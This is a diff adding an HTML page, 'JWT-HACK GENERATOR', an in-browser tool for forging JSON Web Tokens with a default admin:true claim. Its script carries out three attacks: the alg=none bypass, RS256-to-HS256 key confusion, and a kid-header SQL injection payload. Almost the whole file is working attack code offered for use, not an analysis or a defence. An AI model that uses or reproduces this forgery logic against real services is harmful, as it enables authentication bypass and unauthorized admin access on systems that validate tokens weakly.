@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>JWT-HACK // CORE ENGINE</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        :root { --accent: #00ff41; --bg: #0a0a0c; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+        #video-bg { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -1; filter: opacity(0.2); }
+        .container { max-width: 1000px; margin: auto; border: 1px solid var(--accent); padding: 20px; box-shadow: 0 0 20px var(--accent); }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        textarea, input, select { width: 100%; background: #000; border: 1px solid #333; color: var(--accent); padding: 10px; font-family: inherit; margin-bottom: 15px; }
+        label { color: var(--accent); display: block; margin-bottom: 5px; font-weight: bold; }
+        button { background: var(--accent); color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; }
+        .token-box { background: #111; word-break: break-all; padding: 15px; border-left: 5px solid var(--accent); color: #ccc; }
+    </style>
+</head>
+<body>
+    <video autoplay muted loop id="video-bg">
+        <source src="ca63eccfcf11bcd02c1a900196de630f_720w.mp4" type="video/mp4">
+    </video>
+
+    <div class="container">
+        <h2 style="text-align: center;">JWT-HACK GENERATOR [REAL_ENGINE_V2]</h2>
+        
+        <div class="grid">
+            <div>
+                <label>ENGINE CONFIG</label>
+                <select id="attack-type">
+                    <option value="standard">Standard Encoding (Legit)</option>
+                    <option value="none">Attack: alg=none (CVE-2018-1000531)</option>
+                    <option value="confuse">Attack: RS256 to HS256 Confusion</option>
+                    <option value="kid_sqli">Attack: kid SQL Injection</option>
+                </select>
+
+                <label>HMAC SECRET / PUBLIC KEY</label>
+                <input type="text" id="secret-key" placeholder="Enter secret or public key content...">
+                
+                <label>ALGORITHM</label>
+                <select id="alg">
+                    <option value="HS256">HS256</option>
+                    <option value="HS384">HS384</option>
+                    <option value="HS512">HS512</option>
+                </select>
+            </div>
+
+            <div>
+                <label>JSON PAYLOAD (CLAIMS)</label>
+                <textarea id="payload" style="height: 180px;">{
+  "sub": "1234567890",
+  "name": "AuthUser",
+  "admin": true,
+  "iat": 1516239022
+}</textarea>
+            </div>
+        </div>
+
+        <button onclick="generateJWT()">GENERATE_SIGNED_TOKEN</button>
+
+        <div style="margin-top:20px;">
+            <label>RESULTING_JWT</label>
+            <div id="output" class="token-box">Waiting for generation...</div>
+        </div>
+    </div>
+
+    <script>
+        function b64(obj) {
+            const str = JSON.stringify(obj);
+            return btoa(str).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+        }
+
+        function generateJWT() {
+            const attack = document.getElementById('attack-type').value;
+            const secret = document.getElementById('secret-key').value;
+            const alg = document.getElementById('alg').value;
+            let payload = JSON.parse(document.getElementById('payload').value);
+            
+            let header = { "alg": alg, "typ": "JWT" };
+
+            // Apply Real jwt-hack Attack Logic
+            if (attack === "none") {
+                header.alg = "none";
+            } else if (attack === "confuse") {
+                header.alg = "HS256"; // Forcing symmetric verification on asymmetric expected endpoint
+            } else if (attack === "kid_sqli") {
+                header.kid = "' UNION SELECT 'key'--"; // Real SQLi payload in KID header
+            }
+
+            const headerPart = b64(header);
+            const payloadPart = b64(payload);
+            const tokenBase = `${headerPart}.${payloadPart}`;
+
+            let signature = "";
+            if (header.alg !== "none") {
+                let hashMethod;
+                if (alg === "HS256") hashMethod = CryptoJS.HmacSHA256;
+                else if (alg === "HS384") hashMethod = CryptoJS.HmacSHA384;
+                else if (alg === "HS512") hashMethod = CryptoJS.HmacSHA512;
+                
+                const hash = hashMethod(tokenBase, secret);
+                signature = CryptoJS.enc.Base64.stringify(hash)
+                    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+            }
+
+            document.getElementById('output').innerText = `${tokenBase}.${signature}`;
+        }
+    </script>
+</body>
+</html>
